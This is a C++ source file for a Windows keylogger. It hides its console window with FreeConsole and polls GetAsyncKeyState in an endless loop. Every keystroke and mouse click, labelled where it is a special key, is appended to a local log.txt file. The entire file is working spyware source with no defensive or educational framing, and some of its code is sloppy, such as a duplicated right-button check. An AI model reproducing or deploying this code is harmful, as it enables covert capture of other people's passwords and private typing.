#include <iostream>
#include <windows.h>
#include <fstream>

using namespace std;

int save(int _key,char *file)
{
    //cout<<_key<<endl;
    Sleep(10);
    FILE *A;
    A = fopen(file,"a+");

    if(_key == VK_BACK)
       fprintf(A,"[bckspc]");
    else if(_key == VK_RETURN)
       fprintf(A,"[enter]");
    else if(_key == VK_SHIFT)
       fprintf(A,"[shift + ");
    else if(_key == VK_CONTROL)
       fprintf(A,"[ctrl + ");
    else if(_key == VK_INSERT)
       fprintf(A,"[INSERT]");
    else if(_key == VK_HOME)
       fprintf(A,"[HOME]");
    else if(_key == VK_END)
       fprintf(A,"[END]");
    else if(_key == VK_PRINT)
       fprintf(A,"[PRINT SCREEN]");
    else if(_key == VK_PAUSE)
       fprintf(A,"[PAUSE/BREAK]");
    else if(_key == VK_DELETE)
       fprintf(A,"[del]");
    else if(_key == VK_LBUTTON)
       fprintf(A,"[Lclick]");
    else if(_key == VK_RBUTTON)
       fprintf(A,"[Rclick]");
    else if(_key == VK_LEFT)
       fprintf(A,"[LEFT_KEY]");
    else if(_key == VK_RIGHT)
       fprintf(A,"[RIGHT_KEY]");
    else if(_key == VK_UP)
       fprintf(A,"[UP_KEY]");
    else if(_key == VK_DOWN)
       fprintf(A,"[DOWN_KEY]");
    else if(_key == VK_F1)
       fprintf(A,"[F1]");
    else if(_key == VK_F2)
       fprintf(A,"[F2]");
    else if(_key == VK_F3)
       fprintf(A,"[F3]");
    else if(_key == VK_F4)
       fprintf(A,"[F4]");
    else if(_key == VK_F5)
       fprintf(A,"[F5]");
    else if(_key == VK_F6)
       fprintf(A,"[F6]");
    else if(_key == VK_F7)
       fprintf(A,"[F7]");
    else if(_key == VK_F8)
       fprintf(A,"[F8]");
    else if(_key == VK_F9)
       fprintf(A,"[F9]");
    else if(_key == VK_F10)
       fprintf(A,"[F10]");
    else if(_key == VK_F11)
       fprintf(A,"[F11]");
    else if(_key == VK_F12)
       fprintf(A,"[F12]");
    else if(_key == VK_TAB)
       fprintf(A,"[TAB]");
    else if(_key == VK_NUMPAD0)
       fprintf(A,"[NUM 0]");
    else if(_key == VK_NUMPAD1)
       fprintf(A,"[NUM 1]");
    else if(_key == VK_NUMPAD2)
       fprintf(A,"[NUM 2]");
    else if(_key == VK_NUMPAD3)
       fprintf(A,"[NUM 3]");
    else if(_key == VK_NUMPAD4)
       fprintf(A,"[NUM 4]");
    else if(_key == VK_NUMPAD5)
       fprintf(A,"[NUM 5]");
    else if(_key == VK_NUMPAD6)
       fprintf(A,"[NUM 6]");
    else if(_key == VK_NUMPAD7)
       fprintf(A,"[NUM 7]");
    else if(_key == VK_NUMPAD8)
       fprintf(A,"[NUM 8]");
    else if(_key == VK_NUMPAD9)
       fprintf(A,"[NUM 9]");
    else if(_key == VK_ADD)
       fprintf(A,"+");
    else if(_key == VK_LWIN)
       fprintf(A,"[Lwin]");
    else if(_key == VK_RWIN)
       fprintf(A,"[Rwin]");
    else if(_key == VK_MBUTTON)
       fprintf(A,"[Mmouse]");
    else if(_key == VK_RBUTTON)
       fprintf(A,"[Rmouse]");
    else if(_key == VK_SCROLL)
       fprintf(A,"[Mouse Scroll]");
    else if(_key == VK_MULTIPLY)
       fprintf(A,"*");
    else if(_key == VK_DIVIDE)
       fprintf(A,"/");
    else if(_key == VK_SUBTRACT)
       fprintf(A,"-");
    else if(_key == 27)
       fprintf(A,"[ESC]");
    else if(_key == VK_RCONTROL)
       fprintf(A,"[Rctrl]");
    else if(_key == VK_RSHIFT)
       fprintf(A,"[Rshift]");
    else if(_key == 18)
       fprintf(A,"[ALT]");
    else if(_key == 93)
       fprintf(A,"[KeyRclick]");
    else if(_key == 33)
       fprintf(A,"[PgUp]");
    else if(_key == 34)
       fprintf(A,"[PgDown]");
    else
    fprintf(A,"%s",&_key);

    fclose(A);
    return 0;
}

int main()
{
    FreeConsole();
    char i;
    ofstream out;
    while(true){
            Sleep(10);
            for(i = 8; i <= 255; ++i)
            {
                if(GetAsyncKeyState(i) == -32767)
                {
                    save(i,"log.txt");
                }
            }
    }
    return 0;
}
